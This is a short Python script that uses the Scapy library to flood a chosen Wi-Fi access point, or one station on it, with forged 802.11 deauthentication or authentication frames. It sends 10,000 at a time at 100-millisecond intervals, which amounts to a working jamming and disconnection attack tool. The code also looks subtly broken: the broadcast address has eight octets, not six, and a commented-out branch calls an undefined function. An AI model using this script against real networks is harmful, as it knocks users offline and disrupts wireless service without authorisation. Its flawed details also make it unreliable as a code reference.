from scapy.all import Dot11,RadioTap,sendp,RandMAC,Dot11Deauth,Dot11Auth
import argparse

def deauth_broadcast(iface: str, bssid: str):
  dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, count=10000, inter=0.100)

def deauth_station(iface: str, bssid: str, target_mac: str):
  dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Deauth()
  sendp(frame, iface=iface, count=10000, inter=0.100)
  
def auth_broadcast(iface: str, bssid: str):
  print('this is auth')
  dot11 = Dot11(addr1="ff:ff:ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Auth()
  # asso = Dot11AssoReq(cap=0x1100, listen_interval=0x00a)
  sendp(frame, iface=iface, count=10000, inter=0.100)

def auth_station(iface: str, bssid: str, target_mac: str):
  print('this is auth')
  dot11 = Dot11(addr1=target_mac, addr2=bssid, addr3=bssid)
  frame = RadioTap()/dot11/Dot11Auth()
  sendp(frame, iface=iface, count=10000, inter=0.100)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()   
    parser.add_argument("interface")
    parser.add_argument("ap",metavar="MAC")
    parser.add_argument("-s","--station", metavar="MAC",help='')
    parser.add_argument("-auth",help='',action='store_true')
    args = parser.parse_args()
    if args.auth:
      if args.interface and args.ap and args.station:
        auth_station(args.interface, args.ap, args.station)
      elif args.interface and args.ap:
        auth_broadcast(args.interface, args.ap)
      else:
        print('Please!!')
    else:
      if args.interface and args.ap and args.station:
        deauth_station(args.interface, args.ap, args.station)
      elif args.interface and args.ap:
        deauth_broadcast(args.interface, args.ap)
      else:
        print('Please!!')
    '''
    if (args.interface and args.ap and args.station and args.auth):
      auth()
    elif (args.interface and args.ap and args.station):
      deauth_station(args.interface, args.ap, args.station)
    elif (args.interface and args.ap):
      deauth_broadcast(args.interface, args.ap)
    else:
      print('Please!!')
    '''